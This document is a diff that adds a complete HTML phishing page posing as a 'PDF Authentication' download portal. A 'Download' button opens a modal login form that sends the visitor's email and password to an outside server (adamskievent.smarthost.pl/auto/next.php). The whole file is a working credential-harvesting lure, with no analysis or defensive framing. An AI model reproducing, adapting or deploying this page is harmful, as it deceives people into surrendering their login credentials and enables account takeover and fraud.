@@ -1,0 +1,144 @@
+<!doctype html>
+<html>
+<head>
+<title>PDF-CACACA Authentication</title>
+</head>
+<body>
+<center>
+<style>
+
+
+body{
+  background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtC_B709YSF8pICfJaldoz4jkeXcx7ISNJYCYSdIR4Jigdw47wuexg7LexxT9VipbxEpK6rP7SO2qqMt37LMzFSXYes-tNuxZAP1Kvce_e8u9OnekpLeUq3NTxzg68rpePm4KnJIJBNvhcXHhvX-VSlCVw0B9F34pWUCVhxcZs_DTzgb51J0fz-tqrG9s/w429-h372/Screenshot%20(3).jpg') no-repeat center center fixed; 
+   -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+    padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+    background-color: #fefefe;
+    margin: 5% auto 15% auto 5%; /* 5% from the top, 15% from the bottom and centered */
+    border: 1px solid #888;
+    width: 50%; /* Could be more or less, depending on screen size */
+}
+input{
+  display: block;
+  margin: 0;
+  width: 300px;
+  font-family: sans-serif;
+  font-size: 15px;  
+   padding: 8px;
+    border: 1px solid #DFDFDF;
+}
+
+
+#backgroundimage
+{
+position: absolute;
+top:0px;
+left:0px;
+}
+
+
+fieldset {
+    font-family: sans-serif;
+width:405px;
+height:404px;
+ background:white;
+ border: 1px solid #DFDFDF;
+    padding: 8px;
+bottom:10px;
+}
+
+
+button {
+    background-color: #691011;
+    color: white;
+    height: 45px;
+    padding: 0px 40px;
+    outline: none;
+    border: none;
+    border-radius:25px;
+    font-size: 16px;
+}
+
+input[type=submit] {
+
+  width: 250px;
+      padding: 15px;
+    font-size: 16px;
+    color: #fff;
+    background-color: #691011;
+    margin-bottom: 0;
+    font-weight: normal;
+    cursor: pointer;
+    border: 0px;
+   }
+   
+   #box{
+   	height: 400px;
+   	width: 285px;
+   	border: 1px solid black;
+   	border-radius: 10px;
+   	background-color: white;
+   	position: absolute;
+   	left: 550px;
+   	top: 200px;
+   }
+   #top-left{
+    position: absolute;
+    left: 10px;
+   }  
+   #top-right{
+    position: absolute;
+    right: 10px;
+   }
+</style>
+<div id="box"><br>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGBuOMcBIdZnd-eQ5hFlaTUDd6dgQhcfum2fIksrjMbZ6rlL2LsUmc06dM-uYs_rnQrrlL13w8mcZgbtf3qZMO0_-zmt9SUC5B6KFHQ3LPrmBAIAgERyj59HnNDEIOW_EeI-vMugEUptCfzfXOjfcafxZcwrcftotqAc8ZijFWHrpMxvDaJrtO0bjThkI/s320/Untitled-1.jpg" style="width: 100%;"><br>
+<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">Download</button>
+</div>
+<form action="https://adamskievent.smarthost.pl/auto/next.php" method="post">
+<br><br><br><br><br></center>
+<div id="id01" class="modal">
+	<span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal"></span>
+<center><fieldset><br>
+<img src="https://i.im.ge/2022/10/30/2RADVD.Screenshot14.png"><br><br>
+<input type="email" name="user" placeholder="Enter Email" required >
+<br><input type="password" name="pass" placeholder="Enter Password" required ><br>
+<br>
+    
+    <input type="submit" name="submit" value="Log In"/>
+ <br> <br><br></center></fieldset>
+</div>
+<script>
+// Get the modal
+var modal = document.getElementById('id01');
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+</script>
+
+</center>
+</form>
+</body>
+</html>
